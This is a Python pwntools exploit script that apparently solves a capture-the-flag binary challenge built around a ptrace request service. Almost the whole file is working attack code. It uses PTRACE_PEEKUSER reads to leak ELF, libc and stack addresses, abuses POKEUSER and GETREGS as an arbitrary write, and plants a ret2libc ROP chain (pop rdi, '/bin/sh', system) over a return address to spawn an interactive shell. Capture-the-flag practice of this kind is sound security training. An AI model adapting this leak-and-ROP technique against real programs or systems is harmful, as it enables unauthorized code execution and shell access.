#!/usr/bin/env python3

import os
import sys
from pwn import *

QWORD = 8
IGNORED = 0xdeadbeef

elf = ELF("./challenge_patched")
libc = ELF("./given/handout/libc.so.6")
ld = ELF("./given/handout/ld-linux-x86-64.so.2")

context.binary = elf
context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]
rop = ROP(elf)

#p: pwnlib.tubes.tube
if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"challenge" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        gdb.attach(p, "\n".join([
                "set follow-fork-mode parent",
                f"b *{hex(pie_base + 0x1503)}"
            ]))

PTRACE_TRACEME   = 0
PTRACE_PEEKTEXT  = 1
PTRACE_PEEKDATA  = 2
PTRACE_PEEKUSER  = 3
PTRACE_POKETEXT  = 4
PTRACE_POKEDATA  = 5
PTRACE_POKEUSER  = 6
PTRACE_CONT      = 7
PTRACE_KILL      = 8
PTRACE_SINGLESTEP  = 9
PTRACE_GETREGS   = 0x0C
PTRACE_SETREGS   = 0x0D
PTRACE_GETFPREGS  = 0x0E
PTRACE_SETFPREGS  = 0x0F
PTRACE_ATTAC    = 0x10
PTRACE_DETAC    = 0x11
PTRACE_GETFPXREGS  = 0x12
PTRACE_SETFPXREGS  = 0x13
PTRACE_SYSCALL   = 0x18
PTRACE_GET_TREAD_AREA  = 0x19
PTRACE_SET_TREAD_AREA  = 0x1A
PTRACE_ARC_PRCTL  = 0x1E
PTRACE_SYSEMU    = 0x1F
PTRACE_SYSEMU_SINGLESTEP  = 0x20
PTRACE_SINGLEBLOCK  = 0x21
PTRACE_SETOPTIONS  = 0x4200
PTRACE_GETEVENTMSG  = 0x4201
PTRACE_GETSIGINFO  = 0x4202
PTRACE_SETSIGINFO  = 0x4203
PTRACE_GETREGSET  = 0x4204
PTRACE_SETREGSET  = 0x4205
PTRACE_SEIZE     = 0x4206
PTRACE_INTERRUPT  = 0x4207
PTRACE_LISTEN    = 0x4208
PTRACE_PEEKSIGINFO  = 0x4209
PTRACE_GETSIGMASK  = 0x420A
PTRACE_SETSIGMASK  = 0x420B
PTRACE_SECCOMP_GET_FILTER  = 0x420C
PTRACE_SECCOMP_GET_METADATA  = 0x420D
PTRACE_GET_SYSCALL_INFO  = 0x420E
PTRACE_GET_RSEQ_CONFIGURATION  = 0x420F

def ptrace(request, addr, value, again=True):
    p.sendlineafter(b"What ptrace request do you want to send?", hex(request).encode())
    p.sendlineafter(b"What address do you want?", hex(addr).encode())
    p.sendlineafter(b"What do you want copied into data?", hex(value).encode())

    p.recvuntil(b"ptrace returned ")
    ret = p.recvline().strip()
    ret = int(ret, 16)

    another = b"1" if again else b"0"
    p.sendlineafter(b"Do another (0/1)?", another)
    return ret

def arbit_read(addr):
    ret = ptrace(PTRACE_PEEKUSER, addr, IGNORED)
    # log.info(f"Leak: {hex(ret)}")
    return ret

def arbit_write(addr, payload):
    assert(len(payload) % 8 == 0)
    num_qwords = len(payload) // QWORD
    saved_user_data = []

    for i in range(num_qwords):
        val = u64(payload[i*8:i*8+8])
        ptrace(PTRACE_POKEUSER, i*QWORD, val)
    success = ptrace(PTRACE_GETREGS, 0x0, addr)
    log.info(f"arbit write success? {success}")

def exploit():
    # leak elf
    elf.address = arbit_read(8) - 0x3d68
    log.info(f"efl base: {hex(elf.address)}")

    # leak libc
    libc.address = arbit_read(0x80) - 0xeabc7
    log.info(f"libc base: {hex(libc.address)}")

    # leak stack addr
    stack_addr = arbit_read(0x98)
    log.info(f"stack addr: {hex(stack_addr)}")

    # return address hijacking
    pop_rdi = libc.address + 0x2a3e5
    ret = elf.address + 0x101a
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    log.info(f"system offset: {hex(libc.sym['system'] - libc.address)}")
    log.info(f"binsh offset: {hex(next(libc.search(b'/bin/sh')) - libc.address)}")

    # In do_system(), "movaps" instruction requires memory to be 16-byte aligned
    n = 1
    assert(n % 2 == 1)
    payload = n * p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])

    # uses arbit_write(.., cyclic(..)) to brute force search ret_addr_slot
    ret_addr_slot = stack_addr + 0x180
    arbit_write(ret_addr_slot, payload)

    ptrace(PTRACE_PEEKUSER, 0, 0, again=False)
    p.interactive()

if __name__ == "__main__":
    exploit()
